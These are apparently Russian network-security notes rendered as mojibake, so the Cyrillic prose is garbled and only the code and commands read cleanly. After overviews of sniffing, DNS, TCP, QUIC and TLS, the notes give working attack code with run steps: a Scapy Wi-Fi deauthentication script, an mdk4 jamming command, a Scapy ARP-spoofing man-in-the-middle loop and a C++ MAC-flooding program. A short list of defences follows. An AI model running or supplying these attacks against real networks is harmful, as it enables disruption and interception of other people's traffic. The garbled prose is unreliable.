üîπ –°–Ω–∏—Ñ—Ñ–∏–Ω–≥ —Ç—Ä–∞—Ñ–∏–∫–∞

üî∏ –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ
üî∏ HTTP-—Ç—Ä–∞—Ñ–∏–∫ (–ª–æ–≥–∏–Ω—ã, –ø–∞—Ä–æ–ª–∏, –∫—É–∫–∏)
üî∏ POST-–∑–∞–ø—Ä–æ—Å—ã —Å —Ñ–æ—Ä–º–∞–º–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
üî∏ –ü–∞—Ä–æ–ª–∏ —Å —Å–∞–π—Ç–æ–≤ –±–µ–∑ HTTPS
üî∏ FTP, Telnet, SMTP
üî∏ –£—Ç–µ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö
üî∏ DNS-–∑–∞–ø—Ä–æ—Å—ã (–∫–∞–∫–∏–µ —Å–∞–π—Ç—ã –ø–æ—Å–µ—â–∞—é—Ç)
üî∏ –ü–æ–∫–∞–∂–µ—Ç –≤—Å–µ –ø–æ—Å–µ—â–∞–µ–º—ã–µ –¥–æ–º–µ–Ω—ã, –¥–∞–∂–µ –µ—Å–ª–∏ —Ç—Ä–∞—Ñ–∏–∫ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω
üî∏ –¢–∏–ø—ã —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –≤ —Å–µ—Ç–∏
üî∏ –ü–æ MAC-–∞–¥—Ä–µ—Å–∞–º –º–æ–∂–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—è
üî∏ ARP Spoofing –ü–æ–∏—Å–∫ –¥—É–±–ª–∏—Ä—É—é—â–∏—Ö—Å—è ARP-–æ—Ç–≤–µ—Ç–æ–≤:
üî∏ SYN-—Ñ–ª—É–¥ (DDoS) syn_count —Ä–µ–∑–∫–æ —Ä–∞—Å—Ç—ë—Ç ‚Äî –≤–æ–∑–º–æ–∂–Ω–∞ –∞—Ç–∞–∫–∞
üî∏ –ü–æ—Ä—Ç 4444 ‚Äî —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –±–µ–∫–¥–æ—Ä–∞–º–∏
üî∏ –°–ª–∞–±—ã–µ SSL/TLS-–≤–µ—Ä—Å–∏–∏
üî∏ –£—Ç–µ—á–∫–∞ —á–µ—Ä–µ–∑ DNS-over-HTTPS (DoH)
üî∏ –£—Ç–µ—á–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç –∑–∞–ø—Ä–æ—Å–æ–≤ –∫ maps.api.google.com, ipinfo.io
üî∏ –¢—Ä–µ–∫–µ—Ä—ã —Ä–µ–∫–ª–∞–º—ã
üî∏ C2-—Å–µ—Ä–≤–µ—Ä—ã (Command & Control)
üî∏ –†–µ–∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Ñ–∞–π–ª–æ–≤
üî∏ –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ EXE, PDF –∏–∑ HTTP

üîπ HTTPS Everywhere (–∑–∞—â–∏—Ç–∞ –æ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –ø–∞—Ä–æ–ª–µ–π)
üîπ VPN/ToR (—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞)
üîπ ARP-–º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (–æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ spoofing)
üîπ DNS-over-HTTPS (—Å–∫—Ä—ã—Ç–∏–µ DNS-–∑–∞–ø—Ä–æ—Å–æ–≤)

üî∏ Python (Scapy) –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç IP-–ø–∞–∫–µ—Ç—ã
sudo python3 sniff.py
sudo python3 snifflog.py
sudo python3 sniffjson.py
sudo python3 sniffjson2.py
sudo python3 sniffwire.py # .pcap –æ—Ç–∫—Ä—ã—Ç—å –≤ wireshark

üîπ DNS (Domain Name System)
–°–∏—Å—Ç–µ–º–∞ –¥–æ–º–µ–Ω–Ω—ã—Ö –∏–º—ë–Ω
–¥–æ–º–µ–Ω—ã (google.com) –≤ IP-–∞–¥—Ä–µ—Å–∞ (172.217.22.14)
DNS-—Å–µ—Ä–≤–µ—Ä Google ‚Äî 8.8.8.8
DNS-—Å–µ—Ä–≤–µ—Ä –Ø–Ω–¥–µ–∫—Å ‚Äî 77.88.8.8

üîπ TCP (Transmission Control Protocol)
–ù–∞–¥—ë–∂–Ω—ã–π —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–Ω—ã–π –ø—Ä–æ—Ç–æ–∫–æ–ª
–¥–æ—Å—Ç–∞–≤–∫—É –¥–∞–Ω–Ω—ã—Ö –±–µ–∑ –ø–æ—Ç–µ—Ä—å –∏ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–º –ø–æ—Ä—è–¥–∫–µ
(–≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—ã, —Ñ–∞–π–ª—ã, SSH)
–Ω–∞–ø—Ä–∏–º–µ—Ä, 80 –¥–ª—è HTTP, 443 –¥–ª—è HTTPS
–£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è (¬´—Ä—É–∫–æ–ø–æ–∂–∞—Ç–∏–µ¬ª): SYN ‚Üí SYN-ACK ‚Üí ACK
HTTP, FTP, SMTP

üîπ QUIC (Quick UDP Internet Connections)
–ü—Ä–æ—Ç–æ–∫–æ–ª –ø–æ–≤–µ—Ä—Ö UDP, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π Google
–£—Å–∫–æ—Ä–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π –∑–∞ —Å—á—ë—Ç
–ú—É–ª—å—Ç–∏–ø–ª–µ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏—è (–ø–µ—Ä–µ–¥–∞—á–∞ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø–æ—Ç–æ–∫–æ–≤ –¥–∞–Ω–Ω—ã—Ö –≤ –æ–¥–Ω–æ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–∏)
–£–º–µ–Ω—å—à–µ–Ω–∏—è –∑–∞–¥–µ—Ä–∂–∫–∏ (–Ω–µ —Ç—Ä–µ–±—É–µ—Ç ¬´—Ä—É–∫–æ–ø–æ–∂–∞—Ç–∏—è¬ª –∫–∞–∫ TCP)
–í—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (–∫–∞–∫ –≤ TLS)
–í HTTP/3 (–Ω–æ–≤–æ–π –≤–µ—Ä—Å–∏–∏ HTTP)
–ü–æ—Ä—Ç: 443 (–∫–∞–∫ —É HTTPS)
–ë—ã—Å—Ç—Ä–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Å–∞–π—Ç–æ–≤, –æ—Å–æ–±–µ–Ω–Ω–æ –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö

üîπ TLS (Transport Layer Security)
–ü—Ä–æ—Ç–æ–∫–æ–ª —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
–ó–∞—â–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –æ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∏ –ø–æ–¥–¥–µ–ª–∫–∏
–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ HTTPS, VPN, –∑–∞—â–∏—â—ë–Ω–Ω–æ–π –ø–æ—á—Ç–µ
TLS 1.2 (—Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω)
TLS 1.3 (—Å–∞–º—ã–π —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –∏ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π)
–ö–ª–∏–µ–Ω—Ç –∏ —Å–µ—Ä–≤–µ—Ä –¥–æ–≥–æ–≤–∞—Ä–∏–≤–∞—é—Ç—Å—è –æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è (¬´—Ä—É–∫–æ–ø–æ–∂–∞—Ç–∏–µ¬ª)
–í—Å–µ –¥–∞–ª—å–Ω–µ–π—à–∏–µ –¥–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –≤ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º –≤–∏–¥–µ
–ë—Ä–∞—É–∑–µ—Ä –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç üîí —Ä—è–¥–æ–º —Å URL —Å–∞–π—Ç–∞

–ü–æ–∏—Å–∫ –ø–æ ip
ipinfo.io (–µ—Å—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π —Ç–∞—Ä–∏—Ñ)
maxmind.com (–±–∞–∑—ã –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤)
2ip.ru
whatismyipaddress.com
whois 142.250.185.174 | grep -iE "country|city|address"
curl ifconfig.me # ~bash 


üîπ 1.2. Wi-Fi Deauth-–∞—Ç–∞–∫–∞ (–æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –∫–ª–∏–µ–Ω—Ç–æ–≤)
Python (–∏—Å–ø–æ–ª—å–∑—É–µ–º scapy –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ deauth-—Ñ—Ä–µ–π–º–æ–≤)

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

target_mac = "AA:BB:CC:DD:EE:FF"  # MAC –∂–µ—Ä—Ç–≤—ã
ap_mac = "11:22:33:44:55:66"      # MAC —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø–∞
iface = "wlan0"                   # WiFi-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å (–º–æ–Ω–∏—Ç–æ—Ä-—Ä–µ–∂–∏–º)

# –°–æ–∑–¥–∞—ë–º deauth-—Ñ—Ä–µ–π–º
pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()

# –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ —Ü–∏–∫–ª–µ (Ctrl+C –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏)
sendp(pkt, iface=iface, count=1000, inter=0.1)
–ö–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å:

–ü–µ—Ä–µ–≤–µ—Å—Ç–∏ Wi-Fi-–∞–¥–∞–ø—Ç–µ—Ä –≤ –º–æ–Ω–∏—Ç–æ—Ä-—Ä–µ–∂–∏–º:


sudo airmon-ng start wlan0
–ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–∫—Ä–∏–ø—Ç:


sudo python3 deauth.py
–ß—Ç–æ –¥–µ–ª–∞–µ—Ç:

–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ—Ä–µ–π–º—ã –¥–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏, –∑–∞—Å—Ç–∞–≤–ª—è—è –∂–µ—Ä—Ç–≤—É –æ—Ç–∫–ª—é—á–∏—Ç—å—Å—è –æ—Ç Wi-Fi.

üîπ 1.3. Wi-Fi Jamming (–≥–ª—É—à–µ–Ω–∏–µ —Å–∏–≥–Ω–∞–ª–∞)
Bash (–∏—Å–ø–æ–ª—å–∑—É–µ–º mdk4 –¥–ª—è DoS Wi-Fi)

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ mdk4 (Kali Linux)
sudo apt install mdk4

# –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–∞–Ω–∞–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, 6)
sudo mdk4 wlan0 d -c 6
–ß—Ç–æ –¥–µ–ª–∞–µ—Ç:

–ì–ª—É—à–∏—Ç Wi-Fi –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–º –∫–∞–Ω–∞–ª–µ, –¥–µ–ª–∞—è —Å–µ—Ç—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ–π.

2. –ö–∞–Ω–∞–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å (Layer 2)
üîπ 2.1. ARP Spoofing (MITM-–∞—Ç–∞–∫–∞)
Python (Scapy) ‚Äî –ø–æ–¥–º–µ–Ω–∞ ARP-—Ç–∞–±–ª–∏—Ü

from scapy.all import *
import time

target_ip = "192.168.1.100"    # –ñ–µ—Ä—Ç–≤–∞
gateway_ip = "192.168.1.1"     # –†–æ—É—Ç–µ—Ä
iface = "eth0"                 # –°–µ—Ç–µ–≤–æ–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å

def spoof():
    # –ü–æ–¥–º–µ–Ω—è–µ–º ARP-–∫—ç—à –∂–µ—Ä—Ç–≤—ã (–≥–æ–≤–æ—Ä–∏–º, —á—Ç–æ –º—ã ‚Äî —Ä–æ—É—Ç–µ—Ä)
    pkt = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=gateway_ip)
    send(pkt, iface=iface)

    # –ü–æ–¥–º–µ–Ω—è–µ–º ARP-–∫—ç—à —Ä–æ—É—Ç–µ—Ä–∞ (–≥–æ–≤–æ—Ä–∏–º, —á—Ç–æ –º—ã ‚Äî –∂–µ—Ä—Ç–≤–∞)
    pkt = ARP(op=2, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip), psrc=target_ip)
    send(pkt, iface=iface)

# –ó–∞–ø—É—Å–∫–∞–µ–º –∞—Ç–∞–∫—É –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
while True:
    spoof()
    time.sleep(2)
–ö–∞–∫ –∑–∞–ø—É—Å—Ç–∏—Ç—å:


sudo python3 arp_spoof.py
–ß—Ç–æ –¥–µ–ª–∞–µ—Ç:

–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç —Ç—Ä–∞—Ñ–∏–∫ –∂–µ—Ä—Ç–≤—ã —á–µ—Ä–µ–∑ –∞—Ç–∞–∫—É—é—â–µ–≥–æ (Man-in-the-Middle).

–î–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Wireshark –∏–ª–∏ BetterCAP.

üîπ 2.2. MAC-—Ñ–ª—É–¥ (–ø–µ—Ä–µ–≥—Ä—É–∑–∫–∞ –∫–æ–º–º—É—Ç–∞—Ç–æ—Ä–∞)
C++ (–∏—Å–ø–æ–ª—å–∑—É–µ–º libpcap)
cpp
Copy
#include <pcap.h>
#include <cstring>

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    u_char packet[60];
    memset(packet, 0xff, 6);  // MAC –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è: FF:FF:FF:FF:FF:FF (broadcast)
    for (int i = 0; i < 10000; i++) {
        packet[6] = rand() % 256;  // –†–∞–Ω–¥–æ–º–Ω—ã–π MAC –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è
        pcap_sendpacket(handle, packet, 60);
    }
    pcap_close(handle);
    return 0;
}
–ö–∞–∫ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å:


g++ mac_flood.cpp -lpcap -o mac_flood
sudo ./mac_flood
–ß—Ç–æ –¥–µ–ª–∞–µ—Ç:

–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–∞–ª—å—à–∏–≤—ã–µ MAC-–∞–¥—Ä–µ—Å–∞, –ø–µ—Ä–µ–≥—Ä—É–∂–∞—è —Ç–∞–±–ª–∏—Ü—É –∫–æ–º–º—É—Ç–∞—Ç–æ—Ä–∞.

3. –ó–∞—â–∏—Ç–∞ –æ—Ç –∞—Ç–∞–∫
üîí –§–∏–∑–∏—á–µ—Å–∫–∏–π —É—Ä–æ–≤–µ–Ω—å
Wi-Fi: WPA3, –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ WPS, —Å–∫—Ä—ã—Ç–∏–µ SSID.

Ethernet: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ 802.1X (Port Security).

üîí –ö–∞–Ω–∞–ª—å–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å
ARP Spoofing: arpwatch, Dynamic ARP Inspection (Cisco).

MAC-—Ñ–ª—É–¥: Port Security –Ω–∞ –∫–æ–º–º—É—Ç–∞—Ç–æ—Ä–∞—Ö.